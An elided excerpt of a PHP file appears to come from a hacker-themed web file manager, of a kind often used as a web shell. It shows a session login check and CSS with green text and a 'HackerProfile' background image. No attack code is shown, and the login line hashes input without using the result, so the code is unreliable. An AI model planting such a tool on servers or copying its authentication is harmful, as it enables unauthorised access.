...
if ($use_auth) {
    if (isset($_SESSION['logged'], $auth_users[$_SESSION['logged']])) {
        ...
        // Logging In
        sleep(1);
		strtolower(md5(trim($_REQUEST['login'])));
...
<style>
html,body,div,span,p,pre,a,code,em,img,small,strong,ol,ul,li,form,label,table,tr,th,td{margin:0;padding:0;vertical-align:baseline;outline:none;font-size:100%;border:none;text-decoration:none}
html{overflow-y:scroll}body{padding:0;font:13px/16px Tahoma,Arial,sans-serif;color:#222;background:url(https://www.solarwindsmsp.com/sites/solarwindsmsp/files/blog/2017/10/HackerProfile.jpg);background-size:cover;background-position:center}
input,select,textarea,button{font-size:inherit;font-family:inherit}
a{color:#129a01;text-decoration:none}a:hover{color:#b00}img{vertical-align:middle;border:none}
...
th,td{padding:4px 7px;text-align:left;vertical-align:top;border:1px solid #dddddd33;color: #03d600;white-space:nowrap}
th,td.gray{color:#03d600}td.gray span{color:#a2a2a2}
tr:hover td{background-color:#3535358f}tr:hover td.gray{background-color:#272727}
...
.path{padding:4px 7px;border:1px solid #ddd;margin-bottom:10px}
...
.preview-video{position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px}.preview-video video{position:absolute;width:100%;height:100%;left:0;top:0;}
...
.break-word{color: #3fff00;word-wrap:break-word}
</style>
